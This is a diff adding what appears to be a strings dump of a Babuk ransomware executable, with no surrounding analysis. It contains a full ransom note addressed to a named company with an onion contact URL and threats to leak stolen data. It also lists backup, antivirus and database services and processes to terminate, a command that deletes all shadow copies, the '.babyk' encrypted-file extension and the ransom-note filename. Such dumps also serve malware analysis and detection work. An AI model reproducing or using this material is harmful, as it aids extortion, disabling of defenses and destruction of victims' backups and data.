@@ -1,0 +1,254 @@
+!This program cannot be run in DOS mode.
+s|`sw}
+s|`sp}
+s|/rv}
+s|/rq}
+s|Rich
+`.data
+.idata
+@.reloc
+memtas
+mepocs
+sophos
+backup
+GxCIMgr
+DefWatch
+ccEvtMgr
+ccSetMgr
+SavRoam
+RTVscan
+QBFCService
+QBIDPService
+Intuit.QuickBooks.FCS
+QBCFMonitorService
+YooBackup
+zhudongfangyu
+sophos
+stc_raw_agent
+VSNAPVSS
+VeeamTransportSvc
+VeeamDeploymentService
+VeeamNFSSvc
+PDVFSService
+BackupExecVSSProvider
+BackupExecAgentAccelerator
+BackupExecAgentBrowser
+BackupExecDiveciMediaService
+BackupExecJobEngine
+BackupExecManagementService
+BackupExecRPCService
+AcrSch2Svc
+AcronisAgent
+CASAD2DWebSvc
+CAARCUpdateSvc
+IsWow64Process
+kernel32.dll
+kernel32.dll
+Wow64DisableWow64FsRedirection
+kernel32.dll
+Wow64RevertWow64FsRedirection
+advapi32.dll
+SystemFunction036
+Ew----------- [ Hello, Schauer Agrotronic ] ------------->
+       ****BY BABUK LOCKER****
+What happend?
+----------------------------------------------
+Your computers and servers are encrypted, backups are deleted from your network and copied. We use strong encryption algorithms, so you cannot decrypt your data.
+But you can restore everything by purchasing a special program from us - a universal decoder. This program will restore your entire network.
+Follow our instructions below and you will recover all your data.
+If you continue to ignore this for a long time, we will start reporting the hack to mainstream media and posting your data to the dark web.
+What guarantees?
+----------------------------------------------
+We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.
+All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems.
+We guarantee to decrypt one file for free. Go to the site and contact us.
+What information  compromised?
+----------------------------------------------
+We copied more than 50 gb  from your internal network, here are some proofs, for additional confirmations, please chat with us
+In cases of ignoring us, the information will be released to the public.
+How to contact us?
+----------------------------------------------
+Using TOR Browser ( https://www.torproject.org/download/ ):
+http://babukq4e2p4wu4iq.onion/login.php?id=p9gFgBg5TsdcO3mV9mf2RJlJoI0iy1
+!!! DANGER !!!
+DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them.
+!!! DANGER !!
+babuk_v3
+babuk_v3
+lanfirst
+shares
+.rdata
+.rdata$zzzdbg
+.text$di
+.text$mn
+.idata$5
+.00cfg
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.CRT$XCU
+FindFirstVolumeW
+FindNextVolumeW
+FindVolumeClose
+GetDriveTypeW
+GetVolumePathNamesForVolumeNameW
+CloseHandle
+GetLastError
+GetCurrentProcess
+TerminateProcess
+OpenProcess
+GetTickCount
+GetModuleHandleA
+GetProcAddress
+LoadLibraryA
+GlobalAlloc
+lstrcmpW
+lstrlenA
+lstrlenW
+SetVolumeMountPointW
+CreateToolhelp32Snapshot
+Process32FirstW
+Process32NextW
+InitializeCriticalSection
+EnterCriticalSection
+LeaveCriticalSection
+GetCommandLineA
+CreateFileW
+FindClose
+FindFirstFileW
+FindNextFileW
+FlushFileBuffers
+GetFileSizeEx
+GetLogicalDrives
+SetFileAttributesW
+WriteFile
+WaitForSingleObject
+CreateMutexA
+WaitForMultipleObjects
+GetCurrentProcessId
+ExitProcess
+CreateThread
+ExitThread
+SetProcessShutdownParameters
+GetSystemInfo
+MapViewOfFile
+UnmapViewOfFile
+lstrcmpiW
+lstrcpyW
+lstrcatW
+OpenMutexA
+CreateFileMappingA
+MoveFileExW
+HeapAlloc
+HeapFree
+GetProcessHeap
+ReleaseSemaphore
+CreateSemaphoreA
+KERNEL32.dll
+CloseServiceHandle
+ControlService
+EnumDependentServicesA
+OpenSCManagerA
+OpenServiceA
+QueryServiceStatusEx
+CryptAcquireContextW
+CryptGenRandom
+ADVAPI32.dll
+ShellExecuteW
+SHEmptyRecycleBinA
+SHELL32.dll
+RmStartSession
+RmEndSession
+RmRegisterResources
+RmGetList
+RstrtMgr.DLL
+WNetGetConnectionW
+WNetOpenEnumW
+WNetEnumResourceW
+WNetCloseEnum
+MPR.dll
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+IsProcessorFeaturePresent
+4 4%444:4?4\4
+5*696C6M6W6a6k6u6
+77)737
+8<8M8~8
+92979<9D9R9X9`9j9
+:*:`:n:
+; ;0;F;b;v;
+5;5Y5k5x5
+50656B6V6
+7 717i7}7
+8!8.8;8g8Z9d9q9
+<(<-<:<W<f=
+>!>)>/>W?k?s?y?
+0"0(0-030=0D0W0^0c0i0o0u0
+3"3+30363@3J3Z3j3z3
+0 0$0(0,0004080<0@0D0H0L0P0T0X0\0`0d0h0l0p0t0x0|0
+1 1$1(1014181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1|1
+sql.exe
+oracle.exe
+ocssd.exe
+dbsnmp.exe
+synctime.exe
+agntsvc.exe
+isqlplussvc.exe
+xfssvccon.exe
+mydesktopservice.exe
+ocautoupds.exe
+encsvc.exe
+firefox.exe
+tbirdconfig.exe
+mydesktopqos.exe
+ocomm.exe
+dbeng50.exe
+sqbcoreservice.exe
+excel.exe
+infopath.exe
+msaccess.exe
+mspub.exe
+onenote.exe
+outlook.exe
+powerpnt.exe
+steam.exe
+thebat.exe
+thunderbird.exe
+visio.exe
+winword.exe
+wordpad.exe
+notepad.exe
+/c vssadmin.exe delete shadows /all /quiet
+cmd.exe
+Windows
+Windows.old
+Tor Browser
+Internet Explorer
+Google
+Opera Software
+Mozilla
+Mozilla Firefox
+$Recycle.Bin
+ProgramData
+All Users
+autorun.inf
+boot.ini
+bootfont.bin
+bootsect.bak
+bootmgr
+bootmgr.efi
+bootmgfw.efi
+desktop.ini
+iconcache.db
+ntuser.dat
+ntuser.dat.log
+ntuser.ini
+thumbs.db
+ecdh_pub_k.bin
+Program Files
+Program Files (x86)
+.babyk
+How To Restore Your Files.txt
+.babyk
+\How To Restore Your Files.txt
